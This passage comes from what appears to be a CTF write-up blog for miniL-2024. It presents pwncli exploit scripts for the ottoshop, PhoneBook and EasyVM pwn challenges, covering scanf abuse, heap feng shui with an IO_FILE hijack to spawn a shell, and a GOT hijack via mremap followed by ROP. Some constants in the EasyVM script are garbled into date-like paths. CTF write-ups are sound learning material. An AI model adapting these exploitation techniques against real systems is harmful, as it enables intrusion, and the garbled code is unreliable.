class="string">b&#x27;\x48\x87\x19\x5e\xdc\xe1\x17&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">payload = pad_ljust(payload, <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + payload</span><br><span class="line">payload = payload[:<span class="number">0xF</span>]</span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">s(asm(shellcode))</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="ottoshop"><a href="#ottoshop" class="headerlink" title="ottoshop"></a>ottoshop</h3><p>scanf的利用</p>
<p><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/121308367" >scanf的详细介绍<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    addr = <span class="string">&quot;127.0.0.1:35749&quot;</span></span><br><span class="line">    host = addr.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&quot;./ottoshop&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line"><span class="comment"># load_libc()</span></span><br><span class="line"><span class="comment"># libc: ELF = gift[&#x27;libc&#x27;]</span></span><br><span class="line">gift.elf = ELF(<span class="string">&quot;./ottoshop&quot;</span>)</span><br><span class="line"><span class="comment"># launch_gdb(&quot;b *0x402148\nc\n&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&quot;5.exit&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;which&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&quot;name&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&quot;5.exit&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;which&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&quot;name&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">otto</span>(<span class="params">data</span>):</span><br><span class="line">    sla(<span class="string">b&quot;5.exit&quot;</span>, <span class="string">b&quot;666&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;u find it!&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    sla(<span class="string">b&quot;5.exit&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag1 = <span class="number">0x407010</span></span><br><span class="line">flag2 = <span class="number">0x407060</span></span><br><span class="line">name = <span class="number">0x407180</span></span><br><span class="line">money = <span class="number">0x407018</span></span><br><span class="line">gold = <span class="number">0x407980</span></span><br><span class="line">wheelchiar = <span class="number">0x407580</span></span><br><span class="line">main = <span class="number">0x4033F5</span></span><br><span class="line">back = <span class="number">0x4020A4</span></span><br><span class="line"></span><br><span class="line">add(-<span class="number">90</span>, <span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">check()</span><br><span class="line">add(-<span class="number">72</span>, <span class="string">b&quot;otto&quot;</span>)</span><br><span class="line">add(-<span class="number">91</span>, <span class="string">b&quot;\xd0\x8c\x97\xff&quot;</span>)</span><br><span class="line">add(-<span class="number">92</span>, <span class="string">b&quot;\xd0\x9d\x96\x91&quot;</span>)</span><br><span class="line">otto(<span class="string">b&quot;inkey&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;5.exit&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;buy&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;pass&quot;</span>, <span class="string">b&quot;+\n&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;pass&quot;</span>, <span class="string">b&quot;+\n&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;pass&quot;</span>, <span class="string">b&quot;+\n&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(back).encode())</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="PhoneBook"><a href="#PhoneBook" class="headerlink" title="PhoneBook"></a>PhoneBook</h3><p>简单的堆题，打IO_FILE</p>
<p>就是堆比较分散，需要一点堆风水</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;172.23.32.1:3732&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./PhoneBook&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;/home/inkey/pwn/miniL-2024/05/10/miniL-2024//PhoneBook/libc.so.6&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./PhoneBook&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x13ec)\nb *$rebase(0x14e2)\nb *$rebase(0x15aa)\nb *$rebase(0x169b)\nb _IO_flush_all_lockp\nb exit\nc\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    launch_gdb(cmd)</span><br><span class="line">    log_address(<span class="string">&quot;heap&quot;</span>, heap_base + <span class="number">0x290</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name, num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Name?&#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">b&#x27;Phone Number?&#x27;</span>, num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your Choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, name, num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your Choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Name?&#x27;</span>, name)</span><br><span class="line">    sa(<span class="string">b&#x27;Phone Number?&#x27;</span>, num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunklist = <span class="number">0x4050</span></span><br><span class="line">add(<span class="string">&#x27;inkeyaaa&#x27;</span>, <span class="string">&#x27;inkeybbb&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;inkey&#x27;</span>, <span class="string">&#x27;inkeyddd&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;\x02&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;inkeyeee&#x27;</span>, <span class="string">&#x27;inkeyfff&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;inkeyddd&#x27;</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x330</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">0x24</span>):</span><br><span class="line">    add(<span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x25</span>, <span class="number">0x38</span>):</span><br><span class="line">    add(<span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64_ex(heap_base + <span class="number">0x348</span>), <span class="string">b&#x27;inkeyddd&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x2E8</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64_ex(heap_base + <span class="number">0x360</span>) + <span class="string">b&#x27;\x01\x05\n&#x27;</span>, p64_ex(<span class="number">4</span>))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x300</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">0x1E</span>, <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\n&#x27;</span>, <span class="string">b&#x27;\x31\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x1F</span>, <span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\x31\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x2E8</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64_ex(heap_base + <span class="number">0x360</span>) + <span class="string">b&#x27;\x04\x00\n&#x27;</span>, p64_ex(<span class="number">4</span>))</span><br><span class="line">show()</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x219CF0</span></span><br><span class="line"><span class="comment"># libc_base = u64_ex(ru(b&#x27;\x7f&#x27;)[-6:]) - 0x219EE0 - 0xE10</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x300</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line">_IO_wfile_jumps = libc.sym._IO_wfile_jumps</span><br><span class="line">system_addr = libc.sym.system</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0xC</span>, <span class="string">b&#x27;\n&#x27;</span>, p64_ex(_IO_wfile_jumps))</span><br><span class="line">edit(<span class="number">0xB</span>, <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> + p64_ex(heap_base + <span class="number">0x5E8</span>), <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x16</span>, p64_ex(heap_base + <span class="number">0x6D8</span> - <span class="number">0x68</span>), p64_ex(system_addr))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x418</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">0x31</span>, <span class="string">b&#x27;  sh\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x5F8</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">0x31</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x90\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0x300</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x25</span>, <span class="number">0x38</span>):</span><br><span class="line">    dele(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(<span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p24_ex((heap_base + <span class="number">0xB98</span>) &amp; <span class="number">0xFFFFFF</span>))</span><br><span class="line">edit(<span class="number">0x31</span>, p64_ex(protect_ptr((heap_base + <span class="number">0xB70</span>), IO_list_all - <span class="number">0x20</span>)) + <span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">log_libc_base_addr(libc_base)</span><br><span class="line">log_address_ex2(IO_list_all)</span><br><span class="line">add(p64_ex(<span class="number">0</span>) + p64_ex(heap_base + <span class="number">0x420</span>), <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sla(<span class="string">b&#x27;Your Choice:&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h3><p>🐧师傅出的VM题，针不戳啊（😭</p>
<p>就一次的syscall利用，有一段data空间 (0x2024&#x2F;05&#x2F;10&#x2F;miniL-2024&#x2F;0000) 任意读写</p>
<p>利用的syscall目前想到的只有 mremap, vm_process_writev, io_uring</p>
<p>这题我是用mremap将0x2024&#x2F;05&#x2F;10&#x2F;miniL-2024&#x2F;0000重新map到got表处，劫持got，并利用栈迁移的gadget</p>
<p><code>0x00000000004a4319 : mov rsp, rcx ; pop rcx ; jmp rcx</code></p>
<p>随后ROP打orw</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;150&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&quot;124.222.230.184:10011&quot;</span></span><br><span class="line">    host = addr.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&quot;./rootfs/chal&quot;</span>, stdin=PTY, raw=<span class="literal">False</span>)</span><br><span class="line">    load_libc()</span><br><span class="line">    launch_gdb(<span class="string">&quot;b *0x403eef\nb *0x4a4319\nb* 0x4a431d\nc\nc\nni\n&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line"><span class="comment"># libc: ELF = gift[&quot;libc&quot;]</span></span><br><span class="line">gift.elf = ELF(<span class="string">&quot;./rootfs/chal&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NOP</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">&quot;NOP  \n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LOAD</span>(<span class="params">reg, addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;LOAD REG<span class="subst">&#123;reg&#125;</span>, <span class="subst">&#123;addr&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">STORE</span>(<span class="params">reg, addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;STORE REG<span class="subst">&#123;reg&#125;</span>, <span class="subst">&#123;addr&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MOV</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;MOV REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ADD</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;ADD REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SUB</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;SUB REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MUL</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;MUL REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DIV</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;DIV REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AND</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;OR REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">OR</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;AND REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOR</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;XOR REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NOT</span>(<span class="params">reg1</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;NOT REG<span class="subst">&#123;reg1&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SHL</span>(<span class="params">reg1, num</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;SHL REG<span class="subst">&#123;reg1&#125;</span>, <span class="subst">&#123;num&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SHL</span>(<span class="params">reg1, num</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;SHR REG<span class="subst">&#123;reg1&#125;</span>, <span class="subst">&#123;num&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CMP</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;CMP REG<span class="subst">&#123;reg1&#125;</span>, REG<span class="subst">&#123;reg2&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">JMP</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;JMP <span class="subst">&#123;addr&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">JE</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;JE <span class="subst">&#123;addr&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">JNE</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;JNE <span class="subst">&#123;addr&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SET</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;SET REG<span class="subst">&#123;reg&#125;</span>, <span class="subst">&#123;num&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">INT</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;INT <span class="subst">&#123;num&#125;</span>;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HLT</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += <span class="string">f&quot;HLT;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_addr</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">global</span> idx</span><br><span class="line">    SET(<span class="number">0</span>, addr)</span><br><span class="line">    STORE(<span class="number">0</span>, <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x2024</span>/05/<span class="number">10</span>/miniL-<span class="number">2024</span>/<span class="number">0000</span> + idx))[<span class="number">2</span>:])</span><br><span class="line">    idx += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_dev</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;6164762f7665642f&#x27;</span>)</span><br><span class="line">    STORE(<span class="number">0</span>, <span class="number">2024</span>/05/<span class="number">10</span>/miniL-<span class="number">2024</span>/<span class="number">0000</span>)</span><br><span class="line">    SET(<span class="number">0</span>, <span class="number">2024</span>/05/<span class="number">10</span>/miniL-<span class="number">2024</span>/<span class="number">0000</span>)</span><br><span class="line">    INT(<span class="number">2</span>)</span><br><span class="line">    HLT()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_flag</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;67616c662f&#x27;</span>)</span><br><span class="line">    STORE(<span class="number">0</span>, <span class="number">2024</span>/05/<span class="number">10</span>/miniL-<span class="number">2024</span>/<span class="number">0000</span>)</span><br><span class="line">    SET(<span class="number">0</span>, <span class="number">2024</span>/05/<span class="number">10</span>/miniL-<span class="number">2024</span>/<span class="number">0000</span>)</span><br><span class="line">    INT(<span class="number">2</span>)</span><br><span class="line">    HLT()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pid</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    INT(<span class="number">27</span>)</span><br><span class="line">    HLT()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prace_text</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    SET(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">    SET(<span class="number">1</span>, <span class="string">&#x27;2CEAC7&#x27;</span>)</span><br><span class="line">    SET(<span class="number">2</span>, <span class="string">&#x27;403136&#x27;</span>)</span><br><span class="line">    SET(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">    INT(<span class="number">65</span>)</span><br><span class="line">    HLT()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">j_strcmp = <span class="number">0x4E4070</span></span><br><span class="line">rdi = <span class="number">0x4062f3</span></span><br><span class="line">rsi = <span class="number">0x404e68</span></span><br><span class="line">rdx_rbx = <span class="number">0x49688b</span></span><br><span class="line">rcx = <span class="number">0x49d61b</span></span><br><span class="line">ret = <span class="number">0x4062f3</span></span><br><span class="line">open_addr = <span class="number">0x45fdb0</span></span><br><span class="line">read_addr = <span class="number">0x45fee0</span></span><br><span class="line">write_addr = <span class="number">0x45ff80</span></span><br><span class="line">syscall = <span class="number">0x460E10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mremap</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    save_addr(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;44fd30&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;44fa60&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;456dc0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;43b0d0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;456dc0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;4891a0&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;487430&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;453f50&#x27;</span>)</span><br><span class="line">    save_addr(<span 